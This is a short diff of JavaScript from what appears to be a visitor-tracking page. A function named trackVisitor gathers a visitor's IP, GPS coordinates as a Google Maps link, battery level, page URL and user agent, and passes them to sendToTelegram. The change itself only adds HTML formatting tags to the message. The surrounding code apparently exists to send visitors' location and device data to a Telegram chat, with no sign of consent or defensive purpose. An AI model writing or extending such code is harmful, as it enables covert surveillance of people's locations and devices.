@@ -1138,15 +1138,15 @@ async function trackVisitor(pos) {
         if (pos) {
             const googleMapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
             const msg = `
-🚀 User Location Granted!
+🚀 <b>User Location Granted!</b>
 📅 Time: ${profile.time}
 🌐 IP: ${profile.ip}
 📍 Google Map: ${googleMapUrl}
 🔋 Battery: ${profile.battery}
 🔗 Current URL: ${window.location.href}
 
-📱 User Agent (Copy):
-${profile.useragent}
+📱 <b>User Agent (Copy):</b>
+<code>${profile.useragent}</code>
             `;
             sendToTelegram(msg);
         }
